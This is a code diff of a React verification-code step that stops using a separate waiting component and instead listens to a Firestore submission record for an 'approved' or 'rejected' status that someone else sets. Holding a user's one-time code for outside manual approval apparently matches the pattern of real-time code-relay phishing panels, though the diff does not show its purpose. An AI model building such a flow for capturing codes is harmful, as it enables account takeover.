@@ -10,12 +10,13 @@ import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '
 import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
 import { Progress } from '@/components/ui/progress';
 import type { Submission } from '@/lib/types';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useToast } from '@/hooks/use-toast';
-import { WaitingForApproval } from './waiting-for-approval';
 import { cn } from '@/lib/utils';
 import { InfoAlert } from './info-alert';
 import { ResendCode } from './resend-code';
+import { db } from '@/lib/firebase';
+import { doc, onSnapshot } from 'firebase/firestore';
 
 const formSchema = z.object({
   verificationCode: z.string().length(6, "Code must be 6 digits."),
@@ -46,12 +47,34 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
         setTimeout(() => setShake(false), 500);
     };
     
-    const handleRejection = () => {
-        setIsWaiting(false);
-        triggerShake();
-        form.reset();
-        onRejection();
-    };
+    useEffect(() => {
+        if (!isWaiting || !submissionId) return;
+
+        const docRef = doc(db, 'submissions', submissionId);
+        
+        const unsubscribe = onSnapshot(docRef, (docSnap) => {
+            if (docSnap.exists()) {
+                const submission = docSnap.data() as Submission;
+                const status = submission.verificationCodeStatus;
+
+                if (status === 'approved') {
+                    onApproval({ verificationCode: form.getValues().verificationCode });
+                } else if (status === 'rejected') {
+                    setIsWaiting(false);
+                    triggerShake();
+                    form.reset();
+                    onRejection();
+                }
+            }
+        }, (error) => {
+            console.error("Error listening to submission status:", error);
+            toast({ variant: 'destructive', title: 'Error', description: 'Could not listen for status updates.' });
+            setIsWaiting(false);
+        });
+
+        return () => unsubscribe();
+        
+    }, [isWaiting, submissionId, onApproval, onRejection, toast, form]);
 
     const onSubmit = async (values: FormValues) => {
         setIsSubmitting(true);
@@ -85,13 +108,16 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
 
     if (isWaiting) {
         return (
-            <WaitingForApproval
-                submissionId={submissionId}
-                stepToWatch="verificationCode"
-                onApproval={() => onApproval({ verificationCode: form.getValues().verificationCode })}
-                onRejection={handleRejection}
-                promptText="It'll just take a minute to confirm your verification code."
-            />
+            <div className="w-full max-w-lg mx-auto text-center flex flex-col items-center justify-center space-y-8 py-16">
+                <Loader2 className="h-12 w-12 animate-spin text-primary" />
+                
+                <div>
+                     <h2 className="text-xl font-semibold">Confirming your code...</h2>
+                     <p className="text-muted-foreground mt-2">This will just take a moment.</p>
+                </div>
+
+                <ResendCode />
+            </div>
         );
     }
 
@@ -163,4 +189,3 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
         </div>
     );
 }
-
